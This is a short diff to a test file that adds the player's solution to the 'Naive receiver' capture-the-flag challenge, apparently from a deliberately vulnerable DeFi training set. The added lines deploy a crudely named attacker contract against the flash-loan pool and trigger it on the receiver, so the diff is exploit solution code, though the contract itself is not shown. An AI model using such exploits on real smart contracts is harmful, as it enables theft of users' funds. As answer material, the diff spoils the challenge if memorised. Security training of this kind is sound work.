@@ -38,6 +38,8 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const fnr = await (await ethers.getContractFactory('FuckNaiveReceiver', player)).deploy(pool.address);
+        await fnr.connect(player).fuckYou(receiver.address);
     });
 
     after(async function () {
